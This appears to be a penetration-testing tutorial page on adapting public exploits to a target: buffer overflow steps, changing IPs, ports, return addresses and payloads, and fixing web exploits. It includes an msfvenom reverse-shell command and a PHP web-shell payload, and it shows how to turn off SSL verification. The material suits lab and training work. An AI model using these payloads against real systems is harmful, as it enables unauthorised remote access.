# Fixing Exploits

## Fixing Exploits <a id="debugging"></a>

If we have to fix an exploit then we must consider the following options:

1. Can we replicate the environment of our target?
2. Are there some other public exploits in which we can gather information?
3. Do some public exploits are already fixed for our needs?

The best option is to replicate the environment of the target to locally test and fix the exploit, however, sometimes we don't have enough information of the target environment so we have to look for alternatives solutions like gathering information from other public exploits of the same software and version.

## Fixing DOS Exploits

Convert DOS format to Unix format \(e.g UTF-16LE to UTF-8\):

```text
dos2unix exploit_name
```

## Fixing Memory Corruption Exploits <a id="debugging"></a>

The process of a simple stack buffer overflow can include these steps:

1. Create a buffer to trigger the overrun/overflow.
2. Overwrite the return address on the stack to take control of the IP register.
3. Add a payload to the buffer without bad chars.
4. Add a return address like JMP/ESP

If we need to fix a memory corruption exploit like a stack buffer overflow we need to consider the steps above in order to successfully fix the exploit.

### Little Tricks

```text
#One single space or character can ruin the exploit:

"param= " is not like  "param="

# Shikata_ga_Nai Weird Error

Use EXITFUNC=thread first if an error appears and then try again without EXITFUNC=thread.
```

### Inspecting Headers

In some languages like C, we will see some exploits that have some headers that indicate that exploit should be compiled on another operating system, this is where cross-compiling comes into place.

{% embed url="https://nozerobit.gitbook.io/hacknotes/exploitation/cross-compiling-exploits" %}

### Changing IP Addresses

When using remote exploits, in other words, exploits that connect to the target via a socket. We will most likely see some IP address defined in a variable and we need to change that IP address to the address of our target.

**Example:**

```text
# Before
target = 192.168.50.50

# After
target = 10.10.10.10
```

### Changing Port Numbers

When using remote exploits, in other words, exploits that connect to the target via a socket. We will most likely see some port number defined in a variable and we need to change that port number to the port of our target.

**Example**:

```text
# Before
port = 80

# After
port = 8080
```

### Changing Payloads

Memory corruption exploits more often come up with a pre-defined payload and we need to change the payload to another one that executes a reverse shell or a bind shell so that we can establish a connection to the target.

We can use **msfvenom** to generate a payload or we can create our own payload manually:

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.11.13 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

Then we can change the payload with the new generated or manually created payload:

```text
payload = """"
shellcode_here
"""
```

### Changing Return Address

Sometimes we're faced with exploits that use external files like **.dll** as a return address but our target software may not contain those files so we need to modify that return address with an existing address.

**Example**:

```text
#Before
retn = "\xcb\x74\x75\x53"

# After
retn = "\x0c\x84\x09\x08" # 0x0809840c
```

### Changing the Overflow Buffer

A really important detail when modifying memory corruption exploits is the buffer itself. We need to make sure that the overflow buffer has the amount required of the offset in bytes.

**Example**:

```text
# Before
buffer_size = 590

# After
buffer_size = 591
```

### Executing Windows Binaries in Linux

If we have to execute a Windows binary in our Linux host, we will need a tool like **wine**. 

**Example**:

```text
wine exploit_name.exe
```

## Fixing Web Exploits

Web exploits actually have quite a few things to take into consideration, some of these are as follows:

* HTTP or HTTPS?
  * Do we need a certificate?
    * Can we ignore/bypass the certificate?
* Application Path or Web Page Route?
  * Do we need to modify the path or route?
* Does it use authentication?
  * Do we need credentials?
* Which HTTP Method does it use?
  * POST
  * GET

### Changing URL

If the exploit has an URL, more than likely our target will have a different URL, to fix this we will need to change the URL in the exploit.

**Example:**

```text
# Before
url = "http://192.168.50.50"

# After
url = "http://10.10.10.10"
```

### Changing File Paths

If the exploit relies on a file path and the default settings have been changed, it is very likely that our target will have a different path, to fix this we will need to change the file path in the exploit.

**Example:**

```text
# Before
path_url = "http://192.168.50.50/directory/filenameX.php"

# After
path_url = "http://10.10.10.10/directory/directory_two/filenameY.php"
```

### Changing IP Addresses

When using remote exploits, in other words, exploits that execute a reverse shellcode to connect to us via a socket. We will most likely see some IP address defined in a variable and we need to change that IP address to the address of our target.

**Example:**

```text
# Before
target = 192.168.50.50

# After
target = 10.10.10.10
```

### Changing Port Numbers

When using remote exploits, in other words, exploits that execute a reverse shellcode to connect to us via a socket. We will most likely see some port number defined in a variable and we need to change that port number to the port of our target.

**Example**:

```text
# Before
port = 1234

# After
port = 443
```

### Changing Payloads

If the exploit uses a payload that does not perform what we need it to, then we can modify the payload, let's show this with an example:

```text
# Before
payload="<?php phpinfo(); ?>"

# After
payload="<?php system($_GET['cmd']); ?>"
```

### Changing Credentials

If the exploit use credentials to authenticate into the web application and we have some valid credentials then we can change credentials in the exploit:

```text
username=valid_user
password=valid_password
```

### Ignoring SSL 

When a certificate in the remote host cannot be validated we will need to ignore it in order to bypass this validation. 

**Bypassing SSL validation in Python**:

```text
# Module
import requests

# Ignore SSL
verify=False
```

## Fixing Tab Errors <a id="fixing-tab-errors"></a>

This one is relatively simple and every programmer or developer should know about it. Just make sure that the exploit has the same amount of space/tabs through the code, in other words, consistency.

### Spaces vs Tabs

Spaces

* Spaces are consistent through different code editors
* Spaces are not precise
* Spaces are slow
* Spaces don't actually save space
* Files are larger \( 4 Spaces &gt; 1 Tab \)

Tabs

* Tabs can appear differently in code editors
* Tabs are precise
* Tabs are just faster, just hit that Tab key
* Tabs save more space
* Files are smaller \( 4 Spaces &gt; 1 Tab \)

## Installing Missing Libraries <a id="installing-missing-libraries"></a>

Another common issue you may face is missing libraries or modules. 

### Python3 Install Libraries

Ensure that pip is available:

```text
# Unix/Linux
python3 -m pip --version

# Windows
py -m pip --version
```

If `pip` isn’t already installed, then first try to bootstrap it from the standard library:

```text
# Unix/Linux
python3 -m ensurepip --default-pip

# Windows
py -m ensurepip --default-pip
```

While `pip` alone is sufficient to install from pre-built binary archives, up to date copies of the `setuptools` and `wheel` projects are useful to ensure you can also install from source archives:

```text
# Unix/Linux
python3 -m pip install --upgrade pip setuptools wheel

# Windows
py -m pip install --upgrade pip setuptools wheel
```

Install modules with:

```text
pip3 install module_name
pip install module_name
```

Reference:

{% embed url="https://packaging.python.org/tutorials/installing-packages/" %}



